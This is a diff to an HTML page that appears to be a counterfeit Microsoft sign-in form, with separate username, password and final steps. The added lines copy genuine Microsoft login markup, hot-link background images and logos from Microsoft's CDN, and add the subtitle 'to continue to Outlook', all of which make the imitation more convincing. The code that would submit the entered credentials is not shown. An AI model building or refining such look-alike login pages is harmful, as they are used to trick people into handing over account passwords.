@@ -11,10 +11,30 @@
 </head>
 
 <body>
+   <div id="lightboxBackgroundContainer" data-bind="css: { 'provide-min-height': svr.fUsePlaywrightMinHeight },
+    component: { name: 'background-image-control',
+        publicMethods: $page.backgroundControlMethods,
+        event: { load: $page.backgroundImageControl_onLoad } }"><div class="background-image-holder app" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }">
+    <!-- ko if: smallImageUrl -->
+    <div class="background-image-small" data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49-small_e58aafc980614a9cd7796bea7b5ea8f0.jpg&quot;);"></div>
+    <!-- /ko -->
+
+    <!-- ko if: backgroundImageUrl -->
+    <!-- ko if: svr.fUseAltText -->
+    <div id="backgroundImage" role="img" data-bind="backgroundImage: backgroundImageUrl(), externalCss: { 'background-image': true }, ariaLabel: str['STR_Background_Image_AltText']" class="background-image ext-background-image" aria-label="Organization background image" style="background-image: url(&quot;https://aadcdn.msauth.net/shared/1.0/content/images/appbackgrounds/49_7916a894ebde7d29c2cc29b267f1299f.jpg&quot;);"></div>
+    <!-- /ko -->
+    <!-- ko ifnot: svr.fUseAltText --><!-- /ko -->
+        <!-- ko if: useImageMask --><!-- /ko -->
+    <!-- /ko -->
+</div></div>
     <section id="section_uname">
+         <div class="background-logo-holder">
+        <img class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png">
+    </div>
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
+            <div data-bind="text: subtitle || str['WF_STR_App_Title'], externalCss: { 'subtitle': true }" class="subtitle ext-subtitle">to continue to Outlook</div>
             <form>
                 <div class="mb-16">
                     <p id="error_uname" class="error"></p>
@@ -40,6 +60,9 @@
     </section>
 
     <section id="section_pwd" class="d-none">
+        <div class="background-logo-holder">
+        <img class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png">
+    </div>
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
@@ -68,6 +91,9 @@
     </section>
 
     <section id="section_final" class="d-none">
+        <div class="background-logo-holder">
+        <img class="background-logo" role="presentation" data-bind="attr: { src: $page.backgroundLogoUrl }" src="https://aadcdn.msauth.net/shared/1.0/content/images/applogos/53_8b36337037cff88c3df203bb73d58e41.png">
+    </div>
         <div class="auth-wrapper">
             <img src="assets/logo.png" alt="Microsoft" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
